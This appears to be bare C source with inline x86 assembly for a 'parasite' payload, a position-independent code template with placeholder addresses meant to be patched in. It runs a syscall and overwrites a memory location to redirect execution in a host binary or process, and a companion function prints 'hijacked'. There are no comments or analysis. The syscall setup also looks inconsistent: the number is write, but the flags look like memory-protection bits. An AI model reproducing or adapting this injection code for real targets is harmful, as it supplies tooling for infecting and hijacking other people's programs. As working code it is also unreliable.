//
void parasite()
{
    __asm__ volatile
        (
         ".globl b1\n"
         "pusha\n"
         "call b1\n"
         "b0:\n"
         "popl %ebx\n"
         "sub $0x41414141, %ebx\n"
         "add $0x42424242, %ebx\n"
         "mov $0x43434343, %ecx\n"
         "mov $0x1, %edx\n"
         "or $0x2, %edx\n"
         "or $0x4, %edx\n"
         "mov $0x4, %eax\n"
         "int $0x80\n"
         "call b3\n"
         "b4:\n"
         "pop %eax\n"
         "add $0x18, %eax\n"
         "movl %eax, 0x44444444(%eax)\n"
         "popa\n"
		 "movl %ebp, %esp\n"
		 "pop %ebp\n"
         "ret\n"
         "b1:\n"
         "jmp b0\n"
         "b3:\n"
         "jmp b4\n"  
         "add %eax, (%eax)\n"
         );
}

int devil_write()
{
    int __ret;
    char str[10] = { 'h', 'i', 'j', 'a', 'c', 'k', 'e', 'd', '\n', '\0' };
    __asm__ volatile 
        (
         "int $0x80"
         : "=a"(__ret)
         : "0"(4), "b"(1), "c"(str), "d"(10)
        );
    return __ret;
}

int _start()
{
    devil_write();

    return 0;
}
